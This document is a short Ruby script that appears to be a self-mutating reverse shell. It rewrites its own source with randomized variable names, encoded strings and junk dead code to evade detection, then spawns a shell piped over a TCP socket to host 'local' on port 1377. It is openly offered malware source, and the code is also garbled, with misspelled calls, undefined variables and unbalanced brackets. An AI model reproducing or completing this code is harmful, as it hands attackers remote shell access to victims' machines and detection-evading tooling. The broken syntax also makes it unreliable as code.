require "socket"


_chs = [*('a'..'z'), ('0'..'9')]


_src = File.read(__FILE__)


_sar = {}


_ip =  "local"
_port = 1377

_src_src.gsub!([/(\w+)\s=>?\s(.+)/, /^\s+(.+)\s=>?\s(__\w+)/][0]) {
_name = "_#_chs.shuffle[..15].join}"
_sar [$1]
["#{_name} = #{$2} => #{_name}"[rand(2)]
}


_src.gsub!(Regexp.nwe(%w[8222b5e522d5a22292].pack('h*'))) {
_mtc = $1
if _mtc =~ /\#\{/
	_mtc
else 
	_choice = [["#{_mtc} .reverse", ".reverse"], ["#{_mtc}.unpack ('h*')", ".pack('h*')"]][rand(2)] 
	_nst = "#{eval(_choice[0])}"
   (_choice[1] =~/rev/ ? "%<#{_nst}>" : _nst) + _choice[1]
	
end
}
_sar.each { _src.gsub! (1, 2) }
_src.gsub!(/^(\n)/) { [1, 3, 4].include? (rand(10)) ? [%] \nfalse if exdeadcode << 3301\n\n, %<\n$_ =~ // ? 1 : \n>, %\ndefine_method (:exitwhen) {$*.size}\n\n], %|\n\n(0..5).each { STDOUT }\n] [rand (4)] = "\n" } 
IO.write(__FILE__, _src)
spawn("sh", [:in, :out, :err] => TCPSocket.new(_ip, _port))

}
